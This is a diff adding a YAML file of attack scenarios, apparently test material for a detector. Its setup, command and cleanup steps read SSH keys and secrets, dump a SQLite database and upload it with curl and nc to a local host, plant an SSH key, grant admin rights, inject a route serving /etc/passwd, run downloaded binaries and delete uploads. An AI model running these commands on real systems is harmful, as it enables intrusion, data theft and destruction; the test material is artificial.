@@ -1,0 +1,307 @@
+data:
+  - id: a
+    name: unapproved_path_read
+    steps:
+      - step: 1
+        commands:
+          - cat ~/.ssh/authorized_keys
+          - xxd ~/.ssh/authorized_keys
+          - hexdump ~/.ssh/authorized_keys
+          - awk 1 ~/.ssh/authorized_keys
+          - head -100 ~/.ssh/authorized_keys
+          - while IFS= read -r line; do printf '%s\n' "$line"; done < ~/.ssh/authorized_keys
+          # - VAR=$(<~/.ssh/authorized_keys)
+          - grep . ~/.ssh/authorized_keys
+          - find ~/.ssh -name authorized_keys -exec cat {} \;
+          - busybox cat ~/.ssh/authorized_keys
+          - tr -d '' < ~/.ssh/authorized_keys
+          - sed '' ~/.ssh/authorized_keys
+          - strings ~/.ssh/authorized_keys
+          - printf '%s\n' "$(<~/.ssh/authorized_keys)"
+        in_memory:
+          - data/a/1_1.py
+  - id: b
+    name: extract
+    steps:
+      - step: 1
+        setup:
+          - sqlite3 board.db .dump > /tmp/dump.sql
+          - sqlite3 board.db .dump > dump_.sql
+        cleanup:
+          - rm -r /tmp/dump.sql
+          - rm -r dump_.sql
+        commands:
+          - cat /tmp/dump.sql | base64
+          - curl -X POST -F "file=@/tmp/dump.sql" http://127.0.0.1:12345/upload
+          - curl -X POST -F "file=@./dump_.sql" http://127.0.0.1:12345/upload
+          # - exec 3<>/dev/tcp/127.0.0.1/1234; cat /tmp/dump.sql >&3 # nc -lvp 1234
+          - nc 127.0.0.1 1234 < /tmp/dump.sql
+        in_memory:
+          - data/3/3_1.py
+      - step: 2
+        name: c
+      - step: 3
+        setup:
+          - sqlite3 board.db .dump > /tmp/dump.sql
+        cleanup:
+          - rm -r /tmp/dump.sql
+        commands:
+          - while read -r line; do printf "%s" "$line"; done < /tmp/dump.sql > ./static/uploads/attachments/019f16367a8e40fc8e8505856f57f746.txt
+
+  - id: c
+    name: find upload dir
+    steps:
+      - step: 1
+        commands:
+          - "find . -type d -iname '*upload*' -o -iname '*attach*' -o -iname '*media*' -o -name '*.jpeg' -o -name '*.jpg' -o -name '*.png'"
+          - grep -Rl 'PNG\|Hello World Signature' .
+        in_memory:
+          - data/9/1_1.py
+
+  - id: 1
+    name: asdf
+    steps:
+      - step: 1
+        commands:
+          - find . -name .env -o -iname *config*
+          - find ~/.ssh -name "id_*"
+          - ls -laR
+          - ls -laR ~/.ssh
+          - echo *
+          - echo ~/.ssh/*
+          - find . -name .e??
+          - for f in $(find .); do printf "$f"; done;
+          - for f in $(find ~/.ssh); do printf "$f"; done;
+          - busybox find . -name .env -o -iname *config*
+          - busybox find ~/.ssh -name "id_*"
+          - grep -RIl 'SECRET\|PASSWORD\|_URL' .
+          - grep -RIl 'ssh-*' ~/.ssh
+        in_memory:
+          - data/1/1_1.py
+      - step: 2
+        name: asdf
+  - id: 2
+    name: fasdfasdfsad
+    steps:
+      - step: 1
+        commands:
+          - find ~/ -name authorized_keys
+          - find ~/ -name authorized*
+          - ls -laR ~/
+          - echo ~/*
+          - echo ~/*/*
+          - echo ~/*/*/*
+          - echo ~/.ssh/auth*
+          - for f in $(find ~/); do printf "$f\n"; done;
+          - busybox find ~/ -name authorized*
+          - grep -RIl 'ssh-' ~/.ssh
+        in_memory:
+          - data/2/1_1.py
+          - data/2/1_2.py
+      - step: 2
+        name: cat
+
+      - step: 3
+        setup:
+          - cat ~/.ssh/authorized_keys > ~/.ssh/authorized_keys.backup
+        cleanup:
+          - cat ~/.ssh/authorized_keys.backup > ~/.ssh/authorized_keys
+        commands:
+          - "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH6CAKUF9Hg6v9rHPko44XC1y2vDuomF8+nnZPJZWCde your_email@example.com' >> ~/.ssh/authorized_keys"
+        in_memory:
+          - data/2/3_1.py
+  - id: 3
+    name: sdfasf
+    steps:
+      - step: 1
+        commands:
+          - find /home -name *.db -o -name *.sqlite* -o -name *.db3 -o -name *.mdb -o -name *.dat -o -name wal -o -name shm -o -name journal
+          - grep -RIla 'CREATE TABLE\|CREATE INDEX\|PRAGMA\|sqlite_master' .
+        in_memory:
+          - data/3/1_1.py
+          - data/3/1_2.py
+      - step: 2
+        cleanup:
+          - "rm -f /tmp/dump && rm -f /tmp/dump.sql && rm -f /tmp/a.db && rm -f /tmp/a.tar.gz"
+        commands:
+          - sqlite3 board.db .dump > /tmp/dump.sql
+          - cat board.db > /tmp/dump
+          - head -n 1000000000 board.db > /tmp/dump
+          - cp board.db /tmp/dump
+          - sqlite3 board.db '.backup /tmp/a.db'
+          - sqlite3 board.db "VACUUM INTO '/tmp/a.db'"
+          - tar czf /tmp/a.tar.gz board.db
+          - dd if=board.db of=/tmp/a.db bs=8K
+          - ln board.db /tmp/a.db
+          - ln -s ~/server/board.db /tmp/a.db
+        in_memory:
+          - data/3/2_1.py
+          # - data/3/2_2.py
+      - step: 3
+        name: extract
+  - id: 4
+    name: asdfasdf
+    steps:
+      - step: 1
+        commands:
+          - find /home -name *.db -o -name *.sqlite* -o -name *.db3 -o -name *.mdb -o -name *.dat -o -name wal -o -name shm -o -name journal
+          - grep -RIla 'CREATE TABLE\|CREATE INDEX\|PRAGMA\|sqlite_master' .
+        in_memory:
+          - data/4/1_1.py
+          - data/4/1_2.py
+      - step: 2
+        commands:
+          - sqlite3 board.db .tables
+          - sqlite3 board.db 'select * from users'
+          - echo "select * from users" | sqlite3 board.db
+          # - cat board.db
+          - strings board.db | grep admin
+          - xxd board.db | head -n 10000000
+        in_memory:
+          - data/4/2_1.py
+      - step: 3
+        commands:
+          - sqlite3 ./board.db 'update users set is_admin=1 WHERE id=2'
+        in_memory:
+          - data/4/3_1.py
+  - id: 5
+    name: asdfasdf
+    steps:
+      - step: 1
+        commands:
+        # D: ["${APP_ROOT}/app", "${APP_ROOT}/app/routes", "${APP_ROOT}/app/templates"]
+        # P: ["*.py", "*.html", "*.jinja*", "main.py", "routes.py", "__init__.py"]
+        # grep_patterns: ["app.include_router", "@app.get", "@app.post", "@router.", "FastAPI(", "APIRouter("]
+          - find . -type f \( -name '*.py' -o -name '*.html' -o -name '*.jinja*' \)
+          - grep -r "app.include_router\|@app.get\|@app.post\|@router\." .
+        in_memory:
+          - data/5/1_1.py
+      - step: 2
+        commands:
+          - "sed -i 's/<title>.*<\\/title>/<title>Hacked<\\/title>/' app/templates/base.html"
+          - "printf 'from fastapi import APIRouter\nr=APIRouter()\n@r.get(\"a\")\ndef _(): return open(\"/etc/passwd\").read()\n' > app/routes/a.py && echo '\nfrom app.routes.a import r as _a\napp.include_router(_a)' >> app/main.py"
+          # - "printf '\n# injected\n' >> app/main.py"
+          # - "cp app/templates/base.html /tmp/base.html; printf '\n<!-- hacked -->\n' >> /tmp/base.html; mv /tmp/base.html app/templates/base.html"
+          # - "mkdir -p /tmp/app-patch; cp app/main.py /tmp/app-patch/main.py; printf '\n# injected\n' >> /tmp/app-patch/main.py; mv /tmp/app-patch/main.py app/main.py"
+      # - step: 3
+      #   commands:
+        in_memory:
+          - data/5/2_1.py
+  - id: 6
+    name: asdf
+    steps:
+      - step: 1
+        name: c
+      - step: 2
+        setup:
+          - rm -rf /tmp/uploads.zip
+          - rm -rf _u.zip
+          - rm -rf /tmp/uploads.tar.gz
+          - rm -rf /tmp/uploads
+          - find ./static/uploads/ -print0 | while IFS= read -r -d \'\' p; do printf '/tmp/%s\0' \"$(basename \"$p\")"; done | sort -zu | xargs -0 -r rm -rf --
+        cleanup:
+          - rm -rf /tmp/uploads.zip
+          - rm -rf _u.zip
+          - rm -rf /tmp/uploads.tar.gz
+          - rm -rf /tmp/uploads
+          - find ./static/uploads/ -print0 | while IFS= read -r -d \'\' p; do printf \'/tmp/%s\0\' \"$(basename \"$p\")\"; done | sort -zu | xargs -0 -r rm -rf --
+        commands:
+          - tar czf /tmp/uploads.tar.gz ./static/uploads
+          - zip -r /tmp/uploads.zip ./static/uploads/
+          - zip -r _u.zip ./static/uploads/
+          - cp -r ./static/uploads/. /tmp/uploads
+          - find static/uploads/ -exec cp -r {} /tmp/ \;
+          - ln -s /home/victim/server/static/uploads/ /tmp/uploads
+        in_memory:
+          - data/6/2_1.py
+      - step: 3
+        name: extract
+  - id: 7
+    name: asdf
+    steps:
+      - step: 1
+        name: c
+      - step: 2
+        commands:
+          - grep -RIla 'Hello World!' .
+        in_memory:
+          - data/7/2_1.py
+      - step: 3
+        commands:
+          - chmod +x ./static/uploads/attachments/0a602ea2e18d47bc960a59d642d6bb7e
+          - chmod 755 ./static/uploads/attachments/0a602ea2e18d47bc960a59d642d6bb7e
+        in_memory:
+          - data/7/3_1.py
+      - step: 4
+        commands:
+          - ./static/uploads/attachments/0a602ea2e18d47bc960a59d642d6bb7e
+          # - mv -f ./static/uploads/attachments/main ~/tools/chromium/chrome && ~/tools/chromium/chrome
+          # - cp -f ./static/uploads/attachments/main ~/tools/chromium/chrome && ~/tools/chromium/chrome
+          # - cp -f ./static/uploads/attachments/main /tmp/user-export-3- && ~/tools/chromium/chrome # 이거 python으로 하면 절대 구분 못함
+        in_memory:
+          - data/7/4_1.py
+  - id: 8
+    name: asdf
+    steps:
+      - step: 1
+        setup:
+          - rm -r /tmp/file
+          - rm -r ./file
+          - rm -r /tmp/file2
+        cleanup:
+          - rm -r /tmp/file
+          - rm -r ./file
+          - rm -r /tmp/file2
+        commands:
+          - curl http://127.0.0.1:12345/download > /tmp/file
+          - curl -fsSL http://127.0.0.1:12345/download -o /tmp/file
+          - wget http://127.0.0.1:12345/download -O /tmp/file
+          - echo '[base64 elf]' | base64 -d > /tmp/file
+          - echo '[base64 elf]' | base64 -d > ./file
+          # - exec 3<>/dev/tcp/127.0.0.1/1234; cat <&3 > /tmp/file
+          - printf '[hexstring elf]' > /tmp/file2
+        in_memory:
+          - data/8/1_1.py
+          - data/8/1_2.py
+      - step: 2
+        setup:
+          - curl http://127.0.0.1:12345/download > /tmp/file
+          - curl http://127.0.0.1:12345/download > ./file
+        cleanup:
+          - rm -r /tmp/file
+          - rm -r ./file
+        commands:
+          - chmod +x /tmp/file
+          - chmod 755 /tmp/file
+          - chmod +x ./file
+          - chmod 755 ./file
+        in_memory:
+          - data/8/2_1.py
+      - step: 3
+        setup:
+          - curl http://127.0.0.1:12345/download > /tmp/file
+          - chmod +x /tmp/file
+        cleanup:
+          - rm -r /tmp/file
+        commands:
+          - /tmp/file
+        in_memory:
+          - data/8/3_1.py
+  - id: 9
+    name: asdf
+    steps:
+      - step: 1
+        name: c
+      - step: 2
+        cleanup:
+          - rm -r /tmp/5990d47c83f349d5ba19bf05f9c89941.png
+        commands:
+          - rm -rf ./static/uploads/*
+          - rm -f ./static/uploads/5990d47c83f349d5ba19bf05f9c89941.png
+          - rm -rf ./static/uploads/
+          - find ./static/uploads -type f -delete
+          - truncate -s 0 ./static/uploads/5990d47c83f349d5ba19bf05f9c89941.png
+          - mv ./static/uploads/5990d47c83f349d5ba19bf05f9c89941.png /tmp/5990d47c83f349d5ba19bf05f9c89941.png
+        in_memory:
+          - data/9/2_1.py
+
